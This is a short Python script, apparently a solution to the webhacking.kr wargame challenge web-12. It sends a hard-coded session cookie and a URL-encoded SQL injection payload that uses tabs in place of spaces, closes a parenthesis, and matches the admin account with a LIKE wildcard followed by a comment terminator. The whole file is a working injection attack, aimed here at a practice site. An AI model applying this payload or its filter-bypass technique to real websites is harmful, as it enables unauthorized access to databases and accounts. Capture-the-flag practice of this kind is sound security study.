import requests

url = "https://webhacking.kr/challenge/web-12/"
PAYLOAD = "index.php?no=1234%29%09or%09id%09like%09%27admi%25%27%3B--%09-"
PHPSESSID = '4bg5gqcq0i9ka6ktcq875l72hm'

cookie = {'PHPSESSID':PHPSESSID}

resp = requests.get(url + PAYLOAD, cookies=cookie)

print(resp.text)